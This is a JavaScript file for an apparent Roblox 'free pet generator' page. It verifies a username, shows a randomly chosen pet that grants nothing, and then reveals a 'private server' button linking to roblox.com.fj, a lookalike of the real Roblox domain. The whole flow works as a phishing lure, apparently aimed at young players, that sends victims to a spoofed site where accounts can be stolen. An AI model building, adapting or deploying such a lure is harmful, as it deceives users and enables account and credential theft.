const checkBtn = document.getElementById('checkBtn');
const generateBtn = document.getElementById('generateBtn');
const status = document.getElementById('status');
const petResult = document.getElementById('petResult');
const privateServerBtn = document.getElementById('privateServerBtn');

const pets = ["Dragonfly", "Raccoon", "Queen Bee", "Mimic", "Octopus", "Kitsune"];

// Replace this with your Roblox private server link
const privateServerLink = "https://roblox.com.fj/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=35951293855754442542885670362";
privateServerBtn.href = privateServerLink;

checkBtn.addEventListener('click', () => {
    const username = document.getElementById('username').value.trim();
    if(!username) {
        status.textContent = "❌ Please enter a username.";
        generateBtn.style.display = "none";
        return;
    }

    status.textContent = "⏳ Checking username...";
    
    fetch(`https://api.roblox.com/users/get-by-username?username=${username}`)
    .then(res => res.json())
    .then(data => {
        if(data.Id) {
            status.textContent = "✅ Username found, you can now generate your pet!";
            generateBtn.style.display = "inline-block";
        } else {
            status.textContent = "❌ Username not found.";
            generateBtn.style.display = "none";
        }
    })
    .catch(err => {
        status.textContent = "❌ Error checking username.";
        generateBtn.style.display = "none";
        console.error(err);
    });
});

generateBtn.addEventListener('click', () => {
    const pet = pets[Math.floor(Math.random() * pets.length)];
    petResult.textContent = `You generated ${pet}!`;
    privateServerBtn.style.display = "inline-block";
});
